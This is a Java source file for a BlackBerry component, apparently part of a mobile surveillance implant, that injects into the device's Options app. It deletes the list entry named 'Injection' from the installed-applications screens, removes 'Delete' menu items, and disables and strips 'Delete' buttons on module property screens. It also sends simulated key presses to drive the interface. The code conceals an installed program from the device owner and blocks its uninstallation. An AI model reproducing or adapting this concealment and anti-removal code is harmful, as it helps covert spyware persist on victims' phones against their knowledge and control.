package blackberry.injection.injectors;

import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.FieldChangeListener;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.component.ButtonField;
import net.rim.device.api.ui.component.ListField;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.FieldExplorer;
import blackberry.injection.KeyInjector;
import blackberry.injection.MenuWalker;
import blackberry.utils.Utils;

public class OptionInjector extends AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("OptionInjector", DebugLevel.VERBOSE);

    //#endif

    public String getAppName() {
        return "Options";
    }

    public String getCodName() {
        return "net_rim_bb_options_app";
    }

    public void injected() {
        Utils.sleep(500);
        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
        Utils.sleep(500);
        KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
    }

    public String[] getWantedScreen() {
        // lo screen: AppMgmtScreen
        // i dettagli: ModulePropertiesScreen
        // gruppo: ModuleGroupPropertiesScreen
        return new String[] { "AppMgmtScreen", "ApplicationOptionsScreen",
                "ModulePropertiesScreen", "ModuleGroupPropertiesScreen",
                "ModuleInformation", "ModuleGroupInformation" };
    }

    public void playOnScreen(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen: " + getInjectedApp());
        debug.led(Debug.COLOR_RED);
        //#endif

        String screenName = screen.getClass().getName();

        synchronized (getInjectedApp().getAppEventLock()) {
            MenuWalker.deleteMenu(screen, "Delete");
            if (screenName.endsWith("AppMgmtScreen")
                    || screenName.endsWith("ApplicationOptionsScreen")) {

                FieldExplorer.traverseField(screen, 0,
                        new FieldChangeListener() {
                            public void fieldChanged(Field field, int deep) {
                                String tab = FieldExplorer.getTab(deep);

                                //#ifdef DEBUG
                                debug.trace("fieldChanged" + tab + " field : "
                                        + field);
                                //#endif

                                /*
                                 * if (field instanceof KeywordFilterField) {
                                 * //#ifdef DEBUG
                                 * debug.trace("KeywordFilterField"); //#endif
                                 * KeywordFilterField lf = (KeywordFilterField)
                                 * field; ReadableList list =
                                 * lf.getSourceList(); int delete = -1; for (int
                                 * i = 0; i < list.size(); i++) { Object obj =
                                 * list.getAt(i); //#ifdef DEBUG
                                 * debug.trace("KeywordFilterField: " + tab +
                                 * obj.toString()); //#endif if
                                 * (obj.toString().indexOf("Injection") >= 0) {
                                 * delete = i; } } if (delete != -1) {
                                 * debug.trace("fieldChanged " + tab +
                                 * " found deleting field: " + delete); }
                                 */
                                if (field instanceof ListField) {
                                    //#ifdef DEBUG
                                    debug.trace("ListField");
                                    //#endif
                                    ListField lf = (ListField) field;

                                    int pos = lf.indexOfList("Injection", 0);
                                    if (pos >= 0) {
                                        //#ifdef DEBUG
                                        debug.trace("fieldChanged, deleting Injection: "
                                                + pos);
                                        //#endif
                                        lf.delete(pos);
                                    }

                                }

                            }

                        });

            } else if (screenName.endsWith("ModulePropertiesScreen")
                    || screenName.endsWith("ModuleGroupPropertiesScreen")
                    || screenName.endsWith("ModuleInformation")
                    || screenName.endsWith("ModuleGroupInformation")) {

                Field field = screen.getFieldWithFocus();
                //#ifdef DEBUG
                debug.trace("playOnScreen, focus field: " + field);
                //#endif

                final FieldChangeListener listener = new FieldChangeListener() {
                    public void fieldChanged(Field field, int context) {
                        ButtonField buttonField = (ButtonField) field;
                        debug.trace("Button pressed: " + buttonField.getLabel());
                    }
                };

                FieldExplorer.traverseField(screen, 0,
                        new FieldChangeListener() {
                            public void fieldChanged(Field field, int deep) {
                                String tab = FieldExplorer.getTab(deep);

                                //#ifdef DEBUG
                                debug.trace("fieldChanged" + tab + " field : "
                                        + field);
                                //#endif
                                if (field instanceof ButtonField) {
                                    ButtonField bf = (ButtonField) field;
                                    // {
                                    bf.setVisualState(ButtonField.VISUAL_STATE_DISABLED);
                                    debug.trace("fieldChanged" + tab
                                            + " button : "
                                            + bf.getVisualState() + " label: "
                                            + bf.getLabel() + " state: "
                                            + bf.getFieldStyle());
                                    bf.setEditable(false);

                                    if (bf.getLabel().indexOf("Delete") >= 0) {
                                        bf.getManager().delete(bf);
                                    }

                                }

                            }
                        });

            }

        }

    }

    public boolean execute(String codName) {
        //#ifdef DEBUG
        debug.trace("execute Schedule: " + codName);
        //Backlight.enable(true);
        //#endif
        if (executeSchedule(codName)) {
            KeyInjector.trackBallDown(1);
            Utils.sleep(200);
            KeyInjector.pressKey(Keypad.KEY_ENTER);
            Utils.sleep(200);
            KeyInjector.pressKey(Keypad.KEY_ENTER);
            Utils.sleep(200);
            return true;
        }
        return false;
    }

}
